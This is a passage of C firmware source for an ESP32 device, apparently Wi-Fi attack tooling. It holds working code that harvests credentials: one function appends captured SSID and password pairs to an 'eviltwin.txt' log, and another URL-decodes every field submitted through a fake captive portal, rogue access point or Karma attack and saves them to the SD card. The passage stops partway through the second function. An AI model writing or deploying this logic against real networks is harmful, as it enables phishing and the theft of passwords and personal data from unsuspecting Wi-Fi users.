Smethan/projectZero/ESP32C5/main/main.c
    // Check for duplicate before writing
    char match_line[256];
    snprintf(match_line, sizeof(match_line), "\"%s\", \"%s\"", ssid, password);
    
    FILE *file = fopen("/sdcard/lab/eviltwin.txt", "r");
    if (file != NULL) {
        char line[256];
        while (fgets(line, sizeof(line), file) != NULL) {
            if (strstr(line, match_line) != NULL) {
                fclose(file);
                MY_LOG_INFO(TAG, "Credentials already in eviltwin.txt, skipping");
                return;
            }
        }
        fclose(file);
    }
    
    // Try to open file for appending (use short name without underscore for FAT compatibility)
    file = fopen("/sdcard/lab/eviltwin.txt", "a");
    if (file == NULL) {
        MY_LOG_INFO(TAG, "Failed to open eviltwin.txt for append, errno: %d (%s). Trying to create...", errno, strerror(errno));
        
        // Try to create the file first
        file = fopen("/sdcard/lab/eviltwin.txt", "w");
        if (file == NULL) {
            MY_LOG_INFO(TAG, "Failed to create eviltwin.txt, errno: %d (%s)", errno, strerror(errno));
            return;
        }
        // Close and reopen in append mode
        fclose(file);
        file = fopen("/sdcard/lab/eviltwin.txt", "a");
        if (file == NULL) {
            MY_LOG_INFO(TAG, "Failed to reopen eviltwin.txt, errno: %d (%s)", errno, strerror(errno));
            return;
        }
        MY_LOG_INFO(TAG, "Successfully created eviltwin.txt");
    }
    
    // Write SSID and password in CSV format
    fprintf(file, "\"%s\", \"%s\"\n", ssid, password);
    
    // Flush and close file to ensure data is written to disk
    fflush(file);
    fclose(file);
    sd_sync();
    
    MY_LOG_INFO(TAG, "Password saved to eviltwin.txt");
}

// Save portal form data to SD card
static void save_portal_data(const char* ssid, const char* form_data) {
    {
        const char *mode_name = karma_mode_active ? "> Karma Attack" :
                                rogueap_mode_active ? "> Rogue AP" : "> Captive Portal";
        oled_display_update_full(mode_name, ssid ? ssid : "", "  Data received!", "  Saving to SD");
    }
    // Initialize SD card if not already mounted
    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card for portal data logging: %s", esp_err_to_name(ret));
        return;
    }
    
    // Check if /sdcard directory is accessible
    struct stat st;
    if (stat("/sdcard", &st) != 0) {
        MY_LOG_INFO(TAG, "Error: /sdcard directory not accessible");
        return;
    }
    
    // Try to open file for appending
    FILE *file = fopen("/sdcard/lab/portals.txt", "a");
    if (file == NULL) {
        MY_LOG_INFO(TAG, "Failed to open portals.txt for append, errno: %d (%s). Trying to create...", errno, strerror(errno));
        
        // Try to create the file first
        file = fopen("/sdcard/lab/portals.txt", "w");
        if (file == NULL) {
            MY_LOG_INFO(TAG, "Failed to create portals.txt, errno: %d (%s)", errno, strerror(errno));
            return;
        }
        // Close and reopen in append mode
        fclose(file);
        file = fopen("/sdcard/lab/portals.txt", "a");
        if (file == NULL) {
            MY_LOG_INFO(TAG, "Failed to reopen portals.txt, errno: %d (%s)", errno, strerror(errno));
            return;
        }
        MY_LOG_INFO(TAG, "Successfully created portals.txt");
    }
    
    // Write SSID as first field
    fprintf(file, "\"%s\", ", ssid ? ssid : "Unknown");
    
    // Parse form data and extract all fields
    // Form data is in format: field1=value1&field2=value2&...
    char *data_copy = strdup(form_data);
    if (data_copy == NULL) {
        fclose(file);
        sd_sync();
        return;
    }
    
    // Count fields first to properly format CSV
    int field_count = 0;
    char *temp_copy = strdup(form_data);
    if (temp_copy == NULL) {
        MY_LOG_INFO(TAG, "Memory allocation failed for temp_copy");
        free(data_copy);
        fclose(file);
        sd_sync();
        return;
    }
    
    char *token = strtok(temp_copy, "&");
    while (token != NULL) {
        field_count++;
        token = strtok(NULL, "&");
    }
    free(temp_copy);
    
    // Now process each field
    int current_field = 0;
    token = strtok(data_copy, "&");
    while (token != NULL) {
        char *equals = strchr(token, '=');
        if (equals != NULL) {
            *equals = '\0';
            char *key = token;
            char *value = equals + 1;

            // URL decode the key
            char decoded_key[128];
            int decoded_key_len = 0;
            for (char *p = key; *p && decoded_key_len < sizeof(decoded_key) - 1; p++) {
                if (*p == '%' && p[1] && p[2]) {
                    char hex[3] = {p[1], p[2], '\0'};
                    decoded_key[decoded_key_len++] = (char)strtol(hex, NULL, 16);
                    p += 2;
                } else if (*p == '+') {
                    decoded_key[decoded_key_len++] = ' ';
                } else {
                    decoded_key[decoded_key_len++] = *p;
                }
            }
            decoded_key[decoded_key_len] = '\0';

            // URL decode the value
            char decoded_value[128];
            int decoded_len = 0;
            for (char *p = value; *p && decoded_len < sizeof(decoded_value) - 1; p++) {
                if (*p == '%' && p[1] && p[2]) {
                    char hex[3] = {p[1], p[2], '\0'};
                    decoded_value[decoded_len++] = (char)strtol(hex, NULL, 16);
                    p += 2;
                } else if (*p == '+') {
                    decoded_value[decoded_len++] = ' ';
                } else {
                    decoded_value[decoded_len++] = *p;
                }
            }
            decoded_value[decoded_len] = '\0';

            // Write field name and value in CSV format as key=value
            fprintf(file, "\"%s=%s\"", decoded_key, decoded_value);

            // Add comma if not last field
            current_field++;
            if (current_field < field_count) {
                fprintf(file, ", ");
            }
        }
        token = strtok(NULL, "&");
    }
    
